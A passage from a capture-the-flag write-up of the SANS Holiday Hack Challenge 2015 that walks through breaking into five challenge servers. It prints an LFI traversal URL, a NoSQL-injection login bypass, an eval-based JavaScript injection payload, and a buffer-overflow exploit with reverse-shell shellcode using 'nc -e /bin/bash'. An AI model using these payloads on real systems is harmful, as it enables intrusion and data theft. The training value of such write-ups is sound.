**\u0026quot;admin\u0026quot;**, \u0026quot;password\u0026quot; : **\u0026quot;SittingOnAShelf\u0026quot;**, \u0026quot;user_level\u0026quot; : 100 } 2 objects found  Jess confirmed! That confirms the answers to the questions.\n3) What operating system and CPU type are used in the Gnome? What type of web framework is the Gnome web interface built in?\nOperating System: OpenWRT CPU type: ARM\nThe Gnome web interface is built in NodeJS(Express).\n4) What kind of a database engine is used to support the Gnome web interface? What is the plaintext password stored in the Gnome database?\nThe database engine used to support the Gnome web interface is MongoDB. There are two plaintext passwords stored in the Gnome database - \u0026lsquo;user\u0026rsquo; and \u0026lsquo;SittingOnAShelf\u0026rsquo;.\nPart 3: Internet-Wide Scavenger Hunt As we move into Part 3 the Dosis, children come to the shocking conclusion that the SuperGnomes must be scattered across the globe!\nSANS also provided a great hint for this one:\n \u0026quot;If you need inspiration for constructing your search, visit the Dosis Neighborhood and **sho Dan** your plan.\u0026quot;  This was how I located the SuperGnomes:\n I located SG-01 (52.2.229.189) by identifying the IP that was communicating with the Gnome from the packet capture from Part 1 I used the title GIYH::ADMIN PORT V.01 to google dork for additional SuperGnomes, which is how I located SG-02 (52.34.3.80) Next, I used the hint and searched Shodan for SG-02\u0026rsquo;s IP and then for the unique field: X-Powered-By: GIYH::SuperGnome, which presented me with all five SuperGnome IP\u0026rsquo;s and locations  Finally, I located Tom Hessman in the Dosis neighborhood and verified all five Super Gnome IPs.\n5) What are the IP addresses of the five SuperGnomes scattered around the world, as verified by Tom Hessman in the Dosis neighborhood?\n SG-01 = 52.2.229.189 SG-02 = 52.34.3.80 SG-03 = 52.64.191.71 SG-04 = 52.192.152.132 SG-05 = 54.233.105.81  Even though Shodan provided me with the city and country I wanted to double-check them with ipinfo:\n mike@foo:~$ for ip in 52.2.229.189 52.34.3.80 52.64.191.71 52.192.152.132 54.233.105.81; do curl -s ipinfo.io/$ip | egrep 'ip|city|country'; done \u0026quot;ip\u0026quot;: \u0026quot;52.2.229.189\u0026quot;, \u0026quot;city\u0026quot;: \u0026quot;Ashburn\u0026quot;, \u0026quot;country\u0026quot;: \u0026quot;US\u0026quot;, \u0026quot;ip\u0026quot;: \u0026quot;52.34.3.80\u0026quot;, \u0026quot;city\u0026quot;: \u0026quot;Boardman\u0026quot;, \u0026quot;country\u0026quot;: \u0026quot;US\u0026quot;, \u0026quot;ip\u0026quot;: \u0026quot;52.64.191.71\u0026quot;, \u0026quot;city\u0026quot;: \u0026quot;Sydney\u0026quot;, \u0026quot;country\u0026quot;: \u0026quot;AU\u0026quot;, \u0026quot;ip\u0026quot;: \u0026quot;52.192.152.132\u0026quot;, \u0026quot;city\u0026quot;: \u0026quot;Tokyo\u0026quot;, \u0026quot;country\u0026quot;: \u0026quot;JP\u0026quot;, \u0026quot;ip\u0026quot;: \u0026quot;54.233.105.81\u0026quot;, \u0026quot;city\u0026quot;: \u0026quot;São Paulo\u0026quot;, \u0026quot;country\u0026quot;: \u0026quot;BR\u0026quot;,  6) Where is each SuperGnome located geographically?\n SG-01 = United States, Ashburn SG-02 = United States, Boardman SG-03 = Australia, Sydney SG-04 = Japan, Tokyo SG-05 = Brazil, São Paulo  Part 4: Gnomage Pwnage I did a quick nmap scan on each of the SuperGnomes and discovered that they each have a webserver on port 80.\n7) Please describe the vulnerabilities you discovered in the Gnome firmware.\n8) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN IN THE DOSIS NEIGHBORHOOD, attempt to remotely exploit each of the SuperGnomes. Describe the technique you used to gain access to each SuperGnome’s gnome.conf file. YOU ARE AUTHORIZED TO ATTACK ONLY THE IP ADDRESSES THAT TOM HESSMAN IN THE DOSIS NEIGHBORHOOD EXPLICITLY ACKNOWLEDGES AS “IN SCOPE.” ATTACK NO OTHER SYSTEMS ASSOCIATED WITH THE HOLIDAY HACK CHALLENGE.\nI will answer these questions below by describing my methodology to attack the SuperGnomes.\nSG-01 SG-01 was accessed by logging into the SuperGnome web interface on 52.2.229.189 using the admin credentials admin:SittingOnAShelf found in the mongo database in the gnome firmware. After logging in, I explored the available features and was able to download each of the files, including gnome.conf:\n Gnome Serial Number: **NCC1701** Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg Allow new subordinates?: YES Camera monitoring?: YES Audio monitoring?: YES Camera update rate: 60min Gnome mode: SuperGnome Gnome name: SG-01 Allow file uploads?: YES Allowed file formats: .png Allowed file size: 512kb Files directory: /gnome/www/files/  Vulnerability: Password Re-use\nGnome Serial Number: NCC1701 = [https://en.wikipedia.org/wiki/USS_Enterprise_(NCC-1701)]\nSG-02 I logged into SuperGnome-02 (52.34.3.80) with the same credentials, but when I tried to download the files was presented with an error specifying \u0026ldquo;Downloading disabled by Super-Gnome administrator.\u0026rdquo;\nI quickly identified a section in /settings that was not available on SG-01 containing an upload function. This could be the attack vector we need, let\u0026rsquo;s consult the firmware to identify any vulnerabilities:\n{% codeblock index.js %} // CAMERA VIEWER // STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file router.get('/cam', function(req, res, next) { var camera = unescape(req.query.camera); // check for .png //if (camera.indexOf('.png') == -1) // STUART: Removing this\u0026hellip;I think this is a better solution\u0026hellip; right? camera = camera + \u0026lsquo;.png\u0026rsquo;; // add .png if its not found console.log(\u0026ldquo;Cam:\u0026rdquo; + camera); fs.access('./public/images/' + camera, fs.F_OK | fs.R_OK, function(e) { if (e) { res.end(\u0026lsquo;File ./public/images/\u0026rsquo; + camera + ' does not exist or access denied!'); } }); fs.readFile('./public/images/' + camera, function (e, data) { res.end(data); }); }); {% endcodeblock %}\nThe code above was located in /www/routes/index.js. It appears that .png anywhere in the filename will satisfy the check.\nI successfully uploaded a directory named \u0026ldquo;foo.png/\u0026rdquo;.\n Dir /gnome/www/public/upload/UdmXdYtu/foo.png/ created successfully! Insufficient space! File creation error!  Then, I leveraged the LFI (local file inclusion) vulnerability to grab the gnome.conf.\n http://52.34.3.80/cam?camera=../upload/UdmXdYtu/foo.png/../../../../../www/files/gnome.conf  SG-02 gnome.conf:\n Gnome Serial Number: **XKCD988** Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg Allow new subordinates?: YES Camera monitoring?: YES Audio monitoring?: YES Camera update rate: 60min Gnome mode: SuperGnome Gnome name: SG-02 Allow file uploads?: YES Allowed file formats: .png Allowed file size: 512kb Files directory: /gnome/www/files/  Vulnerability: LFI and Directory Traversal\nGnome Serial Number: XKCD988 = [https://xkcd.com/988/]\nSG-03 SuperGnome-03 really stumped me for awhile. I tried logging into the web portal with the same admin credentials but was denied. The user account did work, but did not have sufficient permissions. After talking to some of the individuals in Dosis neighborhood, I learned about NoSQL injection. Looking at the LOGIN POST section of the firmware confirmed my suspicions. I include that code below for reference, it was located in the /www/routes/index.js file.\n{% codeblock index.js %} // LOGIN POST router.post('/', function(req, res, next) { var db = req.db; var msgs = []; db.get(\u0026lsquo;users\u0026rsquo;).findOne({username: req.body.username, password: req.body.password}, function (err, user) { // STUART: Removed this in favor of below. Really guys? //db.get(\u0026lsquo;users\u0026rsquo;).findOne({username: (req.body.username || \u0026ldquo;\u0026quot;).toString(10), password: (req.body.password || \u0026ldquo;\u0026quot;).toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars if (err || !user) { console.log(\u0026lsquo;Invalid username and password: ' + req.body.username + \u0026lsquo;/\u0026rsquo; + req.body.password); msgs.push(\u0026lsquo;Invalid username or password!'); res.msgs = msgs; title = \u0026ldquo;sans holiday challenge 2015 writeup\u0026rdquo; } else { sessionid = gen_session(); sessions[sessionid] = { username: user.username, logged_in: true, user_level: user.user_level }; console.log(\u0026ldquo;User level:\u0026rdquo; + user.user_level); res.cookie(\u0026lsquo;sessionid\u0026rsquo;, sessionid); res.writeHead(301,{ Location: \u0026lsquo;/\u0026rsquo; }); res.end(); } }); }); {% endcodeblock %}\nThe part that tripped me up was forging the Content-Type to \u0026ldquo;application/json\u0026rdquo; in order to use the $ne operator. Note: You can also use $gt here.\nI constructed a POST in Burp in order to bypass the login:\n POST / HTTP/1.1 Host: 52.64.191.71 User-Agent: merry xmas you filthy animal Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 ￼ Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://52.64.191.71/ Cookie: sessionid=duTDpykscaXdKJeH3ioC Connection: close Content-Type: application/json Content-Length: 68 { \u0026quot;username\u0026quot;: {\u0026quot;$eq\u0026quot;: \u0026quot;admin\u0026quot;}, \u0026quot;password\u0026quot;: {\u0026quot;$ne\u0026quot;: \u0026quot;\u0026quot;} }  After forwarding that post, I received:\n SuperGnome 03 Welcome admin, to the GIYH Administrative Portal.  Success! After logging in the web portal is similar to SG-01 and allows us to download the files we need.\nSG-03 gnome.conf:\n Gnome Serial Number: **THX1138** Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg Allow new subordinates?: YES Camera monitoring?: YES Audio monitoring?: YES Camera update rate: 60min Gnome mode: SuperGnome Gnome name: SG-03 Allow file uploads?: YES Allowed file formats: .png Allowed file size: 512kb Files directory: /gnome/www/files/  Vulnerability: NoSQL Injection\nGnome Serial Number: THX1138 = [https://en.wikipedia.org/wiki/THX_1138]\nSG-04 Moving on to SuperGnome-04, we are able to login with the admin:SittingOnAShelf credentials. A quick look around the menus reveals a new section under /files called \u0026ldquo;Upload New File\u0026rdquo;. It allows us to select a post-process option for the uploaded file.\nLet\u0026rsquo;s look at the gnome firmware for any vulnerabilities:\n{% codeblock index.js %} // FILES UPLOAD router.post('/files\u0026rsquo;, upload.single(\u0026lsquo;file\u0026rsquo;), function(req, res, next) { if (sessions[sessionid].logged_in === true \u0026amp;\u0026amp; sessions[sessionid].user_level \u0026gt; 99) { // NEDFORD: this should be 99 not 100 so admins can upload var msgs = []; file = req.file.buffer; if (req.file.mimetype === \u0026lsquo;image/png\u0026rsquo;) { msgs.push(\u0026lsquo;Upload successful.'); var postproc_syntax = req.body.postproc; console.log(\u0026ldquo;File upload syntax:\u0026rdquo; + postproc_syntax); if (postproc_syntax != \u0026lsquo;none\u0026rsquo; \u0026amp;\u0026amp; postproc_syntax !== undefined) { msgs.push(\u0026lsquo;Executing post process\u0026hellip;'); var result; d.run(function() { result = eval('(\u0026rsquo; + postproc_syntax + \u0026lsquo;)'); }); // STUART: (WIP) working to improve image uploads to do some post processing. msgs.push(\u0026lsquo;Post process result: ' + result); } msgs.push(\u0026lsquo;File pending super-admin approval.'); res.msgs = msgs; } else { msgs.push(\u0026lsquo;File not one of the approved formats: .png\u0026rsquo;); res.msgs = msgs; } } else title = \u0026ldquo;sans holiday challenge 2015 writeup\u0026rdquo; next(); }); {% endcodeblock %}\nThere is one major problem with this section of code, that eval is very dangerous. Let\u0026rsquo;s see if we can leverage it to perform some Sever Side Javascript Injection (SSJS). Here is my input from Burp:\n POST /files HTTP/1.1 Host: 52.192.152.132 User-Agent: merry xmas you filthy animal Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://52.192.152.132/files Cookie: sessionid=LRWk1JYQT2V8r6Xyu0th Connection: close Content-Type: multipart/form-data; boundary=---------------------------4590748351909491821833414779 Content-Length: 356 -----------------------------4590748351909491821833414779 Content-Disposition: form-data; name=\u0026quot;postproc\u0026quot; **require('fs').readFileSync('/gnome/www/files/gnome.conf')** -----------------------------4590748351909491821833414779 Content-Disposition: form-data; name=\u0026quot;file\u0026quot;; filename=\u0026quot;foo.png\u0026quot; Content-Type: image/png bar -----------------------------4590748351909491821833414779--  Replacing the \u0026ldquo;postproc\u0026rdquo; call with our readFileSync command allows us to read the contents of gnome.conf. Grabbing the pcap and image just required some encoding due to the larger file sizes.\n require('fs').readFileSync('/gnome/www/files/20151203133815.zip','hex')  SG-04 gnome.conf:\n Gnome Serial Number: **BU22_1729_2716057** Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg Allow new subordinates?: YES Camera monitoring?: YES Audio monitoring?: YES Camera update rate: 60min Gnome mode: SuperGnome Gnome name: SG-04 Allow file uploads?: YES Allowed file formats: .png Allowed file size: 512kb Files directory: /gnome/www/files/  Vulnerability: SSJS - Server Side Javascript Injection\nGnome Serial Number: BU22_1729_2716057 = [https://en.wikipedia.org/wiki/Bender_(Futurama)]\nSG-05 This one got me. I knew that it involved the code provided on the other SuperGnomes, sgnet and sgstatd.\nI looked at the source code and determined that there was an extra port open on SG-05.\nI probed it with netcat:\n mike@foo:~/sans-holiday-hack-2015$ nc 54.233.105.81 4242 Welcome to the SuperGnome Server Status Center! Please enter one of the following options: 1 - Analyze hard disk usage 2 - List open TCP sockets 3 - Check logged in users  Interesting. I explored each of the menu options, but did not detect anything that would assist with exploitation. Let\u0026rsquo;s take a look at the source code:\n{% codeblock sgtatd.c %} if (choice != 2) { write(sd, \u0026ldquo;\\nWelcome to the SuperGnome Server Status Center!\\n\u0026rdquo;, 51); write(sd, \u0026ldquo;Please enter one of the following options:\\n\\n\u0026rdquo;, 45); write(sd, \u0026ldquo;1 - Analyze hard disk usage\\n\u0026rdquo;, 28); write(sd, \u0026ldquo;2 - List open TCP sockets\\n\u0026rdquo;, 26); write(sd, \u0026ldquo;3 - Check logged in users\\n\u0026rdquo;, 27); fflush(stdout);\nrecv(sd, \u0026amp;choice, 1, 0);\nswitch (choice) { case 49: case 50: case 51: case 88: write(sd, \u0026ldquo;\\n\\nH\u0026rdquo;, 4); Truncated write(sd, \u0026ldquo;Enter a short message to share with GnomeNet (please allow 10 seconds) =\u0026gt; \u0026ldquo;, 75); fflush(stdin); sgstatd(sd); {% endcodeblock %}\nHm, the switch statement contains an extra case. The other case values appear to refer to the decimal value of the character (1=49, 2=50, 51=3). A quick look at an ASCII chart tells us that 88 = \u0026lsquo;X\u0026rsquo;.\nLet\u0026rsquo;s see if we can trigger the hidden menu item:\n{% codeblock lang:bash %} mike@foo:~/sans-holiday-hack-2015$ nc 54.233.105.81 4242\nWelcome to the SuperGnome Server Status Center! Please enter one of the following options:\n1 - Analyze hard disk usage 2 - List open TCP sockets 3 - Check logged in users X\nHidden command detected!\nEnter a short message to share with GnomeNet (please allow 10 seconds) =\u0026gt; This function is protected! {% endcodeblock %}\nLooking at the source code, we see some interesting items:\n{% codeblock sgtatd.c %} int sgstatd(sd) { asm(\u0026ldquo;movl $0xe4ffffe4, -4(%ebp)\u0026quot;); //Canary pushed\nchar bin[100]; write(sd, \u0026quot;\\nThis function is protected!\\n\u0026quot;, 30); fflush(stdin); //recv(sd, \u0026amp;bin, 200, 0); sgnet_readn(sd, \u0026amp;bin, 200); __asm__(\u0026quot;movl -4(%ebp), %edx\\n\\t\u0026quot; \u0026quot;xor $0xe4ffffe4, %edx\\n\\t\u0026quot; // Canary checked \u0026quot;jne sgnet_exit\u0026quot;); return 0;  } {% endcodeblock %}\n The code allocates a 100 byte buffer then reads and stores 200 bytes. There is a mention of a canary in the function.  I fired up Kali and setup a nice test lab to develop my code to exploit the buffer overflow. I grabbed the compiled version of the binary from the firmware image extract.\nI like using pattern_create.rb for interacting with buffers instead of trying to guesstimate:\n root@kali-32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 175 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A  Let\u0026rsquo;s take a look at the sgstatd function in gdb:\n{% codeblock lang:bash %} (gdb) disass sgstatd Dump of assembler code for function sgstatd: 0x0804935d \u0026lt;+0\u0026gt;: push %ebp 0x0804935e \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x08049360 \u0026lt;+3\u0026gt;: sub $0x88,%esp 0x08049366 \u0026lt;+9\u0026gt;: movl $0xe4ffffe4,-0x4(%ebp) 0x0804936d \u0026lt;+16\u0026gt;: movl $0x1e,0x8(%esp) 0x08049375 \u0026lt;+24\u0026gt;: movl $0x8049d53,0x4(%esp) 0x0804937d \u0026lt;+32\u0026gt;: mov 0x8(%ebp),%eax 0x08049380 \u0026lt;+35\u0026gt;: mov %eax,(%esp) 0x08049383 \u0026lt;+38\u0026gt;: call 0x8048af0 write@plt 0x08049388 \u0026lt;+43\u0026gt;: mov 0x804b2e0,%eax 0x0804938d \u0026lt;+48\u0026gt;: mov %eax,(%esp) 0x08049390 \u0026lt;+51\u0026gt;: call 0x80489a0 fflush@plt 0x08049395 \u0026lt;+56\u0026gt;: movl $0xc8,0x8(%esp) 0x0804939d \u0026lt;+64\u0026gt;: lea -0x6c(%ebp),%eax 0x080493a0 \u0026lt;+67\u0026gt;: mov %eax,0x4(%esp) 0x080493a4 \u0026lt;+71\u0026gt;: mov 0x8(%ebp),%eax 0x080493a7 \u0026lt;+74\u0026gt;: mov %eax,(%esp) 0x080493aa \u0026lt;+77\u0026gt;: call 0x804990b \u0026lt;sgnet_readn\u0026gt; 0x080493af \u0026lt;+82\u0026gt;: mov -0x4(%ebp),%edx 0x080493b2 \u0026lt;+85\u0026gt;: xor $0xe4ffffe4,%edx 0x080493b8 \u0026lt;+91\u0026gt;: jne 0x804933f \u0026lt;sgnet_exit\u0026gt; 0x080493be \u0026lt;+97\u0026gt;: mov $0x0,%eax 0x080493c3 \u0026lt;+102\u0026gt;: leave 0x080493c4 \u0026lt;+103\u0026gt;: ret End of assembler dump. {% endcodeblock %}\nIt appears that the canary is a static value 0xe4ffffe4. \u0026ldquo;It\u0026rsquo;s a bold strategy, Cotton. Let\u0026rsquo;s see if it pays off for \u0026lsquo;em.\u0026rdquo;\nFirst step was loading some configuration options into gdb to disable the alarm and follow the fork. I\u0026rsquo;ve included them for reference:\n set follow-fork-mode child set detach-on-fork off set follow-exec-mode new handle SIGALRM ignore  While testing the message \u0026ldquo;Canary not repaired.\u0026rdquo; was firing, I was able to pinpoint the canary location at 105 characters. After setting my canary value, I ran into my next challenge: ASLR. I ended up using a common bypass technique by tracking down a \u0026ldquo;jmp esp\u0026rdquo; gadget using the tool ROPgadget.py:\n root@kali-32:~/Desktop# python ROPgadget/ROPgadget.py --binary \\_giyh-firmware-dump.bin.extracted/squashfs-root/usr/bin/sgstatd | grep \u0026quot;jmp\u0026quot; 0x08049365 : add bh, al ; inc ebp ; cld ; in al, -1 ; jmp esp 0x08049363 : add byte ptr [eax], al ; add bh, al ; inc ebp ; cld ; in al, -1 ; jmp esp 0x080493ae : add byte ptr [ebx - 0xd7e03ab], cl ; in al, -1 ; jmp esp 0x08049368 : cld ; in al, -1 ; jmp esp 0x08049369 : in al, -1 ; jmp esp 0x08049367 : inc ebp ; cld ; in al, -1 ; jmp esp **0x0804936b : jmp esp** 0x08048c40 : ljmp 0xd1d0011f, 0x75f8 ; add dh, bl ; ret  I fired up metasploit to craft my payload. Important note: I modified my output to remove the IP of my server. I don\u0026rsquo;t need any copy and paste \u0026ldquo;mistakes\u0026rdquo; occurring  :) !\n{% codeblock lang:bash %} root@kali-32:~# msfconsole msf \u0026gt; use payload/linux/x86/exec msf payload(exec) \u0026gt; set CMD \u0026lsquo;nc 127.0.0.1 6666 -e /bin/bash\u0026rsquo; CMD =\u0026gt; nc 127.0.0.1 6666 -e /bin/bash msf payload(exec) \u0026gt; generate\nlinux/x86/exec - 70 bytes http://www.metasploit.com VERBOSE=false, PrependFork=false, PrependSetresuid=false, PrependSetreuid=false, PrependSetuid=false, PrependSetresgid=false, PrependSetregid=false, PrependSetgid=false, PrependChrootBreak=false, AppendExit=false, CMD=nc 127.0.0.1 6666 -e /bin/bash buf = \u0026ldquo;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\u0026rdquo; + \u0026ldquo;\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x1f\\x00\\x00\u0026rdquo; + \u0026ldquo;\\x00\\x6e\\x63\\x20\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\x20\u0026rdquo; + \u0026ldquo;\\x36\\x36\\x36\\x36\\x20\\x2d\\x65\\x20\\x2f\\x62\\x69\\x6e\\x2f\\x62\u0026rdquo; + \u0026ldquo;\\x61\\x73\\x68\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026rdquo; {% endcodeblock %}\nHere is my final exploit: {% codeblock lang:python %} #!/usr/bin/env python import socket import time\nhost = \u0026lsquo;54.233.105.81\u0026rsquo; port = 4242\nInitial connection s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port))\nSend X and wait print s.recv(1) s.send(\u0026lsquo;X\u0026rsquo;) time.sleep(3)\nVariables for buffer a = \u0026ldquo;\\x41\u0026rdquo; * 104 canary = \u0026ldquo;\\xe4\\xff\\xff\\xe4\u0026rdquo; b = \u0026ldquo;\\x42\\x42\\x42\\x42\u0026rdquo; jmp = \u0026ldquo;\\x6b\\x93\\x04\\x08\u0026rdquo;\nAdding Payload payload = \u0026ldquo;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\u0026rdquo; payload += \u0026ldquo;\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x1f\\x00\\x00\u0026rdquo; payload += \u0026ldquo;\\x00\\x6e\\x63\\x20\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\x20\u0026rdquo; payload += \u0026ldquo;\\x36\\x36\\x36\\x36\\x20\\x2d\\x65\\x20\\x2f\\x62\\x69\\x6e\\x2f\\x62\u0026rdquo; payload += \u0026ldquo;\\x61\\x73\\x68\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026rdquo;\nCraft and send buffer = a + canary + b + jmp + payload s.send(buffer) s.close() {% endcodeblock %} I started up a netcat listener on my server to catch the connection:\n{% codeblock lang:bash %} mike@foo:~$ nc -nlvp 3535 Listening on [0.0.0.0] (family 0, port 3535) Connection from [54.233.105.81] port 3535 [tcp/*] accepted (family 2, sport 45173) id uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) hostname sg5 {% endcodeblock %}\nNice! Next, I setup some netcat tunnels and exfiled the data located in /gnome/www/files/.\nSG-05 gnome.conf:\n Gnome Serial Number: **4CKL3R43V4** Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg Allow new subordinates?: YES Camera monitoring?: YES Audio monitoring?: YES Camera update rate: 60min Gnome mode: SuperGnome Gnome name: SG-05 Allow file uploads?: YES Allowed file formats: .png Allowed file size: 512kb Files directory: /gnome/www/files/  Vulnerability: Buffer Overflow\nGnome Serial Number: 4CKL3R43V4 = [http://www.sou.edu/cs/lynnackler.html]\nJust in case anyone was curious, I mentioned earlier that I did not finish SG-05 before the submission deadline. I was close, but finding the JMP ESP to bypass ASLR did not happen until after I submitted my report and finished the Netflix series. (Ha!)\nI love the detail and thought put into every little part of this challenge, even the gnome serial numbers had significance.\nPart 5: Sinister Plot and Attribution Packet Capture Evidence I obtained these packet capture from each of the SuperGnomes. I opened each one in wireshark and \u0026lsquo;Followed the TCP stream\u0026rsquo; to reveal a number of emails.\nSG-01:\n From: \u0026quot;c\u0026quot; \u0026lt;c@atnascorp.com\u0026gt; To: \u0026lt;jojo@atnascorp.com\u0026gt; Subject: GiYH Architecture Date: Fri, 26 Dec 2014 10:10:55 -0500 JoJo, As you know, I hired you because you are the best architect in town for a distributed surveillance system to satisfy our rather unique business requirements. We have less than a year from today to get our final plans in place. Our schedule is aggressive, but realistic. I've sketched out the overall Gnome in Your Home architecture in the diagram attached below. Please add in protocol details and other technical specifications to complete the architectural plans. Remember: to achieve our goal, we must have the infrastructure scale to upwards of 2 million Gnomes. Once we solidify the architecture, you'll work with the hardware team to create device specs and we'll start procuring hardware in the February 2015 timeframe. I've also made significant progress on distribution deals with retailers. Thoughts? Looking forward to working with you on this project! -C  SG-02:\n From: \u0026quot;c\u0026quot; \u0026lt;c@atnascorp.com\u0026gt; To: \u0026lt;supplier@ginormouselectronicssupplier.com\u0026gt; Subject: =?us-ascii?Q?Large_Order_-\\_Immediate_Attention_Required?= Date: Wed, 25 Feb 2015 09:30:39 -0500 Maratha, As a follow-up to our phone conversation, we'd like to proceed with an order of parts for our upcoming product line. We'll need two million of each of the following components: + Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9 CPU and Linux SDK) + ON Semiconductor AR0330: 3 MP 1/3\u0026quot; CMOS Digital Image Sensor + Atheros AR6233X Wi-Fi adapter + Texas Instruments TPS65053 switching power supply + Samsung K4B2G16460 2GB SSDR3 SDRAM + Samsung K9F1G08U0D 1GB NAND Flash Given the volume of this purchase, we fully expect the 35% discount you mentioned during our phone discussion. If you cannot agree to this pricing, we'll place our order elsewhere. We need delivery of components to begin no later than April 1, 2015, with 250,000 units coming each week, with all of them arriving no later than June 1, 2015. Finally, as you know, this project requires the utmost secrecy. Tell NO ONE about our order, especially any nosy law enforcement authorities. Regards, -CW  SG-03:\n From: \u0026quot;c\u0026quot; \u0026lt;c@atnascorp.com\u0026gt; To: \u0026lt;burglerlackeys@atnascorp.com\u0026gt; Subject: All Systems Go for Dec 24, 2015 Date: Tue, 1 Dec 2015 11:33:56 -0500 My Burgling Friends, Our long-running plan is nearly complete, and I'm writing to share the date when your thieving will commence! On the morning of December 24, 2015, each individual burglar on this email list will receive a detailed itinerary of specific houses and an inventory of items to steal from each house, along with still photos of where to locate each item. The message will also include a specific path optimized for you to hit your assigned houses quickly and efficiently the night of December 24, 2015 after dark. Further, we've selected the items to steal based on a detailed analysis of what commands the highest prices on the hot-items open market. I caution you - steal only the items included on the list. DO NOT waste time grabbing anything else from a house. There's no sense whatsoever grabbing crumbs too small for a mouse! As to the details of the plan, remember to wear the Santa suit we provided you, and bring the extra large bag for all your stolen goods. If any children observe you in their houses that night, remember to tell them that you are actually \u0026quot;Santy Claus\u0026quot;, and that you need to send the specific items you are taking to your workshop for repair. Describe it in a very friendly manner, get the child a drink of water, pat him or her on the head, and send the little moppet back to bed. Then, finish the deed, and get out of there. It's all quite simple - go to each house, grab the loot, and return it to the designated drop-off area so we can resell it. And, above all, avoid Mount Crumpit! As we agreed, we'll split the proceeds from our sale 50-50 with each burglar. Oh, and I've heard that many of you are asking where the name ATNAS comes from. Why, it's reverse SANTA, of course. Instead of bringing presents on Christmas, we'll be stealing them! Thank you for your partnership in this endeavor. Signed: -CLW President and CEO of ATNAS Corporation  SG-04:\n From: \u0026quot;c\u0026quot; \u0026lt;c@atnascorp.com\u0026gt; To: \u0026lt;psychdoctor@whovillepsychiatrists.com\u0026gt; Subject: Answer To Your Question Date: Thu, 3 Dec 2015 13:38:15 -0500 Dr. O'Malley, In your recent email, you inquired: \\\u0026gt; When did you first notice your anxiety about the holiday season? Anxiety is hardly the word for it. It's a deep-seated hatred, Doctor. Before I get into details, please allow me to remind you that we operate under the strictest doctor-patient confidentiality agreement in the business. I have some very powerful lawyers whom I'd hate to invoke in the event of some leak on your part. I seek your help because you are the best psychiatrist in all of Who-ville. To answer your question directly, as a young child (I must have been no more than two), I experienced a life-changing interaction. Very late on Christmas Eve, I was awakened to find a grotesque green Who dressed in a tattered Santa Claus outfit, standing in my barren living room, attempting to shove our holiday tree up the chimney. My senses heightened, I put on my best little-girl innocent voice and asked him what he was doing. He explained that he was \u0026quot;Santy Claus\u0026quot; and needed to send the tree for repair. I instantly knew it was a lie, but I humored the old thief so I could escape to the safety of my bed. That horrifying interaction ruined Christmas for me that year, and I was terrified of the whole holiday season throughout my teen years. I later learned that the green Who was known as \u0026quot;the Grinch\u0026quot; and had lost his mind in the middle of a crime spree to steal Christmas presents. At the very moment of his criminal triumph, he had a pitiful change of heart and started playing all nicey-nice. What an amateur! When I became an adult, my fear of Christmas boiled into true hatred of the whole holiday season. I knew that I had to stop Christmas from coming. But how? I vowed to finish what the Grinch had started, but to do it at a far larger scale. Using the latest technology and a distributed channel of burglars, we'd rob 2 million houses, grabbing their most precious gifts, and selling them on the open market. We'll destroy Christmas as two million homes full of people all cry \u0026quot;BOO-HOO\u0026quot;, and we'll turn a handy profit on the whole deal. Is this \u0026quot;wrong\u0026quot;? I simply don't care. I bear the bitter scars of the Grinch's malfeasance, and singing a little \u0026quot;Fahoo Fores\u0026quot; isn't gonna fix that! What is your advice, doctor? Signed, Cindy Lou Who  SG-05:\n From: \u0026quot;Grinch\u0026quot; \u0026lt;grinch@who-villeisp.com\u0026gt; To: \u0026lt;c@atnascorp.com\u0026gt; Subject: My Apologies \u0026amp; Holiday Greetings Date: Tue, 15 Dec 2015 16:09:40 -0500 Dear Cindy Lou, I am writing to apologize for what I did to you so long ago. I wronged you and all the Whos down in Who-ville due to my extreme misunderstanding of Christmas and a deep-seated hatred. I should have never lied to you, and I should have never stolen those gifts on Christmas Eve. I realize that even returning them on Christmas morn didn't erase my crimes completely. I seek your forgiveness. You see, on Mount Crumpit that fateful Christmas morning, I learned th[4 bytes missing in capture file]at Christmas doesn't come from a store. In fact, I discovered that Christmas means a whole lot more! When I returned their gifts, the Whos embraced me. They forgave. I was stunned, and my heart grew even more. Why, they even let me carve the roast beast! They demonstrated to me that the holiday season is, in part, about forgiveness and love, and that's the gift that all the Whos gave to me that morning so long ago. I honestly tear up thinking about it. I don't expect you to forgive me, Cindy Lou. But, you have my deepest and most sincere apologies. And, above all, don't let my horrible actions from so long ago taint you in any way. I understand you've grown into an amazing business leader. You 